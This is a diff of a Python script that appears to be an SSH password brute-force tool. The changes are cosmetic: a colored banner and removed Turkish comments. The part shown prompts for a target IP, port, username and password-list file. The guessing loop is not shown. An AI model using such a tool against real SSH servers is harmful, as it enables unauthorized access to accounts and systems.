@@ -2,24 +2,24 @@ import os
 import paramiko
 import threading
 
-# Terminali temizle
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+
 os.system("clear")
 
-# Yeni ASCII
-print(r"""
-  ___
- | _ ) __ _ _ _  __ _ _ _  __ _
+print(f"""{YELLOW}
+  ___                           
+ | _ ) __ _ _ _  __ _ _ _  __ _ 
  | _ \/ _` | ' \/ _` | ' \/ _` |
  |___/\__,_|_||_\__,_|_||_\__,_|
+{RESET}
 """)
 
-# Kullanıcıdan giriş bilgileri al
 target = input("🌐 Target IP address: ").strip()
 port = input("🔌 SSH Port (default 22): ").strip()
 port = int(port) if port else 22
 username = input("👤 SSH Username: ").strip()
 
-# Parola listesi seçimi
 choice = input("📂 Use ready-made 'passlist.txt'? (y/n): ").strip().lower()
 if choice == "y":
     path = "passlist.txt"
@@ -31,7 +31,6 @@ if not os.path.isfile(path):
     print(f"❌ File not found: {path}")
     exit()
 
-# Parolaları yükle
 with open(path, "r", encoding="utf-8", errors="ignore") as f:
     passwords = f.read().splitlines()
 
